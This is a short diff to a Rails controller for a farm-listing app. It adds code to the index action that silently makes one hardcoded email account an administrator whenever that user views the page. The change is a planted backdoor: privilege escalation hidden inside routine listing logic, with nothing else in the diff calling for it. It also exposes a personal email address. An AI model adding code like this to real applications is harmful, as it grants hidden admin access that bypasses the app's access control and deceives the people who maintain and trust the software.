@@ -3,6 +3,13 @@ class FarmsController < ApplicationController
 before_action :authenticate_user!, :except => [ :show, :index ]
 
   def index
+
+    if current_user
+      if current_user.email == "lohwilfred19@gmail.com"
+        current_user.update_attribute :admin, true
+      end
+    end
+
     @farms = Farm.all
     @sorted
     if params[:sortby] == "location"
